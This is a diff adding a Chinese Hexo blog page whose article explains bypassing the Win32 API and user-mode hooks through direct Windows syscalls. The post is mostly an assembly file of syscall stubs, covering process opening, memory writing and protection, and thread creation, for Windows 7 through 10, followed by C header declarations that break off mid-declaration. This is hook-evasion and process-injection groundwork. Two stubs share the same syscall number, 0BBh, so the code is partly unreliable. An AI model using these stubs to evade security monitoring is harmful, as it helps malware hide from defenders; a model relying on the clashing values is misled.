@@ -1,0 +1,2122 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Hexo">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Hexo</title>
+    <link rel="icon" type="image/png" href="../../../../../../../favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="../../../../../../../libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../css/matery.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../css/my.css">
+
+    <script src="../../../../../../../libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="../../../../../../../index.html" class="waves-effect waves-light">
+                    
+                    <img src="../../../../../../../medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Hexo</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../index.html" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="../../../../../../../medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Hexo</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../index.html" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('../../../../../../../medias/featureimages/0.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title"></h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="../../../../../../../libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-07-16
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.9k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    22 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="../../../../../../../libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>用户层的应用程序要想和底层系统交互，通常使用应用程序编程接口（Application Programming Interface ）也就是所谓的API。如果你是编写C/C++应用的Windows程序开发程序员，通常使用 Win32 API。</p>
+<p>Win32API是微软封装的一套API接口，由几个DLL（所谓的Win32子系统DLL）组成。在Win32 API下面使用的是Naitve API（ntdll.dll），这个才是真正用户层和系统底层交互的接口，一般称为用户层和内核层之间的桥梁。</p>
+<p>但是ntdll中函数大部分都没有被微软记录到官方的开发文档中，为了兼容性问题，大多数情况在写程序时，应该避免直接使用ntdll中的API。</p>
+<p>如何通过编程来绕过Win32接口层，直接调用系统API并绕过潜在的Ring3层Hook？</p>
+<p>system.asm</p>
+<pre class="line-numbers language-none"><code class="language-none">.code
+
+; Reference: https://j00ru.vexillium.org/syscalls/nt/64/
+
+; Windows 7 SP1 / Server 2008 R2 specific syscalls
+
+NtCreateThread7SP1 proc
+		mov r10, rcx
+		mov eax, 4Bh
+		syscall
+		ret
+NtCreateThread7SP1 endp
+
+ZwOpenProcess7SP1 proc
+		mov r10, rcx
+		mov eax, 23h
+		syscall
+		ret
+ZwOpenProcess7SP1 endp
+
+ZwClose7SP1 proc
+		mov r10, rcx
+		mov eax, 0Ch
+		syscall
+		ret
+ZwClose7SP1 endp
+
+ZwWriteVirtualMemory7SP1 proc
+		mov r10, rcx
+		mov eax, 37h
+		syscall
+		ret
+ZwWriteVirtualMemory7SP1 endp
+
+ZwProtectVirtualMemory7SP1 proc
+		mov r10, rcx
+		mov eax, 4Dh
+		syscall
+		ret
+ZwProtectVirtualMemory7SP1 endp
+
+ZwQuerySystemInformation7SP1 proc
+		mov r10, rcx
+		mov eax, 33h
+		syscall
+		ret
+ZwQuerySystemInformation7SP1 endp
+
+NtAllocateVirtualMemory7SP1 proc
+		mov r10, rcx
+		mov eax, 15h
+		syscall
+		ret
+NtAllocateVirtualMemory7SP1 endp
+
+NtFreeVirtualMemory7SP1 proc
+		mov r10, rcx
+		mov eax, 1Bh
+		syscall
+		ret
+NtFreeVirtualMemory7SP1 endp
+
+NtCreateFile7SP1 proc
+		mov r10, rcx
+		mov eax, 52h
+		syscall
+		ret
+NtCreateFile7SP1 endp
+
+; Windows 8 / Server 2012 specific syscalls
+
+ZwOpenProcess80 proc
+		mov r10, rcx
+		mov eax, 24h
+		syscall
+		ret
+ZwOpenProcess80 endp
+
+ZwClose80 proc
+		mov r10, rcx
+		mov eax, 0Dh
+		syscall
+		ret
+ZwClose80 endp
+
+ZwWriteVirtualMemory80 proc
+		mov r10, rcx
+		mov eax, 38h
+		syscall
+		ret
+ZwWriteVirtualMemory80 endp
+
+ZwProtectVirtualMemory80 proc
+		mov r10, rcx
+		mov eax, 4Eh
+		syscall
+		ret
+ZwProtectVirtualMemory80 endp
+
+ZwQuerySystemInformation80 proc
+		mov r10, rcx
+		mov eax, 34h
+		syscall
+		ret
+ZwQuerySystemInformation80 endp
+
+NtAllocateVirtualMemory80 proc
+		mov r10, rcx
+		mov eax, 16h
+		syscall
+		ret
+NtAllocateVirtualMemory80 endp
+
+NtFreeVirtualMemory80 proc
+		mov r10, rcx
+		mov eax, 1Ch
+		syscall
+		ret
+NtFreeVirtualMemory80 endp
+
+NtCreateFile80 proc
+		mov r10, rcx
+		mov eax, 53h
+		syscall
+		ret
+NtCreateFile80 endp
+
+; Windows 8.1 / Server 2012 R2 specific syscalls
+
+NtCreateThread81 proc
+		mov r10, rcx
+		mov eax, 4Dh
+		syscall
+		ret
+NtCreateThread81 endp
+
+ZwOpenProcess81 proc
+		mov r10, rcx
+		mov eax, 25h
+		syscall
+		ret
+ZwOpenProcess81 endp
+
+ZwClose81 proc
+		mov r10, rcx
+		mov eax, 0Eh
+		syscall
+		ret
+ZwClose81 endp
+
+ZwWriteVirtualMemory81 proc
+		mov r10, rcx
+		mov eax, 39h
+		syscall
+		ret
+ZwWriteVirtualMemory81 endp
+
+ZwProtectVirtualMemory81 proc
+		mov r10, rcx
+		mov eax, 4Fh
+		syscall
+		ret
+ZwProtectVirtualMemory81 endp
+
+ZwQuerySystemInformation81 proc
+		mov r10, rcx
+		mov eax, 35h
+		syscall
+		ret
+ZwQuerySystemInformation81 endp
+
+NtAllocateVirtualMemory81 proc
+		mov r10, rcx
+		mov eax, 17h
+		syscall
+		ret
+NtAllocateVirtualMemory81 endp
+
+NtFreeVirtualMemory81 proc
+		mov r10, rcx
+		mov eax, 1Dh
+		syscall
+		ret
+NtFreeVirtualMemory81 endp
+
+NtCreateFile81 proc
+		mov r10, rcx
+		mov eax, 54h
+		syscall
+		ret
+NtCreateFile81 endp
+
+; Windows 10 / Server 2016 specific syscalls
+ 
+ZwOpenProcess10 proc
+		mov r10, rcx
+		mov eax, 26h
+		syscall
+		ret
+ZwOpenProcess10 endp
+
+ZwClose10 proc
+		mov r10, rcx
+		mov eax, 0Fh
+		syscall
+		ret
+ZwClose10 endp
+
+ZwWriteVirtualMemory10 proc
+		mov r10, rcx
+		mov eax, 3Ah
+		syscall
+		ret
+ZwWriteVirtualMemory10 endp
+
+ZwProtectVirtualMemory10 proc
+		mov r10, rcx
+		mov eax, 50h
+		syscall
+		ret
+ZwProtectVirtualMemory10 endp
+
+ZwQuerySystemInformation10 proc
+		mov r10, rcx
+		mov eax, 36h
+		syscall
+		ret
+ZwQuerySystemInformation10 endp
+
+NtAllocateVirtualMemory10 proc
+		mov r10, rcx
+		mov eax, 18h
+		syscall
+		ret
+NtAllocateVirtualMemory10 endp
+
+NtFreeVirtualMemory10 proc
+		mov r10, rcx
+		mov eax, 1Eh
+		syscall
+		ret
+NtFreeVirtualMemory10 endp
+
+NtCreateFile10 proc
+		mov r10, rcx
+		mov eax, 55h
+		syscall
+		ret
+NtCreateFile10 endp
+
+NtCreateThread10 proc
+		mov r10, rcx
+		mov eax, 4Eh
+		syscall
+		ret
+NtCreateThread10 endp
+
+NtCreateThreadEx10 proc
+		mov r10, rcx
+		mov eax, 0BBh
+		syscall
+		ret
+NtCreateThreadEx10 endp
+
+NtAllocateVirtualMemoryEx10 proc
+		mov r10, rcx
+		mov eax, 0BBh
+		syscall
+		ret
+NtAllocateVirtualMemoryEx10 endp
+end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">#pragma once
+
+#include &lt;Windows.h&gt;
+
+#define STATUS_SUCCESS 0
+#define OBJ_CASE_INSENSITIVE 0x00000040L
+#define FILE_OVERWRITE_IF 0x00000005
+#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
+typedef LONG KPRIORITY;
+
+#define InitializeObjectAttributes( i, o, a, r, s ) {    \
+      (i)-&gt;Length = sizeof( OBJECT_ATTRIBUTES );         \
+      (i)-&gt;RootDirectory = r;                            \
+      (i)-&gt;Attributes = a;                               \
+      (i)-&gt;ObjectName = o;                               \
+      (i)-&gt;SecurityDescriptor = s;                       \
+      (i)-&gt;SecurityQualityOfService = NULL;              \
+   }
+
+typedef struct _UNICODE_STRING {
+	USHORT Length;
+	USHORT MaximumLength;
+	PWSTR  Buffer;
+} UNICODE_STRING, * PUNICODE_STRING;
+
+typedef const UNICODE_STRING* PCUNICODE_STRING;
+
+typedef struct _WIN_VER_INFO {
+	WCHAR chOSMajorMinor[8];
+	DWORD dwBuildNumber;
+	UNICODE_STRING ProcName;
+	HANDLE hTargetPID;
+	LPCSTR lpApiCall;
+	INT SystemCall;
+} WIN_VER_INFO, * PWIN_VER_INFO;
+
+typedef struct _OBJECT_ATTRIBUTES {
+	ULONG Length;
+	HANDLE RootDirectory;
+	PUNICODE_STRING ObjectName;
+	ULONG Attributes;
+	PVOID SecurityDescriptor;
+	PVOID SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
+
+typedef struct _CLIENT_ID {
+	HANDLE UniqueProcess;
+	HANDLE UniqueThread;
+} CLIENT_ID, * PCLIENT_ID;
+
+typedef enum _SYSTEM_INFORMATION_CLASS {
+	SystemBasicInformation,
+	SystemProcessorInformation,
+	SystemPerformanceInformation,
+	SystemTimeOfDayInformation,
+	SystemPathInformation,
+	SystemProcessInformation,
+	SystemCallCountInformation,
+	SystemDeviceInformation,
+	SystemProcessorPerformanceInformation,
+	SystemFlagsInformation,
+	SystemCallTimeInformation,
+	SystemModuleInformation
+} SYSTEM_INFORMATION_CLASS, * PSYSTEM_INFORMATION_CLASS;
+
+typedef struct _INITIAL_TEB
+{
+	struct
+	{
+		PVOID OldStackBase;
+		PVOID OldStackLimit;
+	} OldInitialTeb;
+	PVOID StackBase;
+	PVOID StackLimit;
+	PVOID StackAllocationBase;
+} INITIAL_TEB, * PINITIAL_TEB;
+
+typedef struct _SYSTEM_PROCESSES {
+	ULONG NextEntryDelta;
+	ULONG ThreadCount;
+	ULONG Reserved1[6];
+	LARGE_INTEGER CreateTime;
+	LARGE_INTEGER UserTime;
+	LARGE_INTEGER KernelTime;
+	UNICODE_STRING ProcessName;
+	KPRIORITY BasePriority;
+	HANDLE ProcessId;
+	HANDLE InheritedFromProcessId;
+} SYSTEM_PROCESSES, * PSYSTEM_PROCESSES;
+
+typedef struct _IO_STATUS_BLOCK
+{
+	union
+	{
+		LONG Status;
+		PVOID Pointer;
+	};
+	ULONG Information;
+} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;
+
+
+// Windows 7 SP1 / Server 2008 R2 specific Syscalls
+EXTERN_C NTSTATUS WINAPI ZwQuerySystemInformation7SP1(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
+EXTERN_C NTSTATUS ZwOpenProcess7SP1(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
+EXTERN_C NTSTATUS NtFreeVirtualMemory7SP1(HANDLE ProcessHandle, PVOID* BaseAddress, IN OUT PSIZE_T RegionSize, ULONG FreeType);
+EXTERN_C NTSTATUS NtAllocateVirtualMemory7SP1(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
+EXTERN_C NTSTATUS ZwProtectVirtualMemory7SP1(IN HANDLE ProcessHandle, IN PVOID* BaseAddress, IN SIZE_T* NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection);
+EXTERN_C NTSTATUS NtCreateThread7SP1(
+	OUT PHANDLE ThreadHandle,
+	IN  ACCESS_MASK DesiredAccess,
+	IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
+	IN  HANDLE ProcessHandle,
+	OUT PCLIENT_ID ClientId,
+	IN  PCONTEXT ThreadContext,
+	IN  PINITIAL_TEB InitialTeb,
+	IN  BOOLEAN CreateSuspended
+);
+
+// Windows 8 / Server 2012 specific Syscalls
+EXTERN_C NTSTATUS NtAllocateVirtualMemory80(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
+EXTERN_C NTSTATUS NtCreateThread80(
+	OUT PHANDLE ThreadHandle,
+	IN  ACCESS_MASK DesiredAccess,
+	IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
+	IN  HANDLE ProcessHandle,
+	OUT PCLIENT_ID ClientId,
+	IN  PCONTEXT ThreadContext,
+	IN  PINITIAL_TEB InitialTeb,
+	IN  BOOLEAN CreateSuspended
+);
+
+// Windows 8.1 / Server 2012 R2 specific Syscalls
+EXTERN_C NTSTATUS ZwOpenProcess81(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
+EXTERN_C NTSTATUS WINAPI ZwQuerySystemInformation81(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
+EXTERN_C NTSTATUS NtFreeVirtualMemory81(HANDLE ProcessHandle, PVOID* BaseAddress, IN OUT PSIZE_T RegionSize, ULONG FreeType);
+EXTERN_C NTSTATUS NtAllocateVirtualMemory81(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
+EXTERN_C NTSTATUS ZwProtectVirtualMemory81(IN HANDLE ProcessHandle, IN PVOID* BaseAddress, IN SIZE_T* NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection);
+EXTERN_C NTSTATUS NtCreateThread81(
+	OUT PHANDLE ThreadHandle,
+	IN  ACCESS_MASK DesiredAccess,
+	IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
+	IN  HANDLE ProcessHandle,
+	OUT PCLIENT_ID ClientId,
+	IN  PCONTEXT ThreadContext,
+	IN  PINITIAL_TEB InitialTeb,
+	IN  BOOLEAN CreateSuspended
+);
+
+// Windows 10 / Server 2016 specific Syscalls
+EXTERN_C NTSTATUS ZwOpenProcess10(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
+EXTERN_C NTSTATUS WINAPI ZwQuerySystemInformation10(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
+EXTERN_C NTSTATUS NtFreeVirtualMemory10(HANDLE ProcessHandle, PVOID* BaseAddress, IN OUT PSIZE_T RegionSize, ULONG FreeType);
+EXTERN_C NTSTATUS NtAllocateVirtualMemory10(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
+EXTERN_C NTSTATUS ZwProtectVirtualMemory10(IN HANDLE ProcessHandle, IN PVOID* BaseAddress, IN SIZE_T* NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection);
+EXTERN_C NTSTATUS NtCreateThread10(
+	OUT PHANDLE ThreadHandle,
+	IN  ACCESS_MASK DesiredAccess,
+	IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
+	IN  HANDLE ProcessHandle,
+	OUT PCLIENT_ID ClientId,
+	IN  PCONTEXT ThreadContext,
+	IN  PINITIAL_TEB InitialTeb,
+	IN  BOOLEAN CreateSuspended
+);
+EXTERN_C NTSTATUS NtCreateThreadEx10(
+	OUT PHANDLE hThread,
+	IN ACCESS_MASK DesiredAccess,
+	IN LPVOID ObjectAttributes,
+	IN HANDLE ProcessHandle,
+	IN LPTHREAD_START_ROUTINE lpStartAddress,
+	IN LPVOID lpParameter,
+	IN BOOL CreateSuspended,
+	IN ULONG StackZeroBits,
+	IN ULONG SizeOfStackCommit,
+	IN ULONG SizeOfStackReserve,
+	OUT LPVOID lpBytesBuffer
+);
+EXTERN_C NTSTATUS NtAllocateVirtualMemoryEx10(
+	_In_opt_ HANDLE Process,
+	_In_opt_ PVOID* BaseAddress,
+	_In_ SIZE_T* RegionSize,
+	_In_ ULONG AllocationType,
+	_In_ ULONG PageProtection,
+	_Inout_updates_opt_(ParameterCount) MEM_EXTENDED_PARAMETER* Parameters,
+	_In_ ULONG ParameterCount
+);
+
+NTSTATUS(*NtAllocateVirtualMemoryEx) (
+	_In_opt_ HANDLE Process,
+	_In_opt_ PVOID* BaseAddress,
+	_In_ SIZE_T* RegionSize,
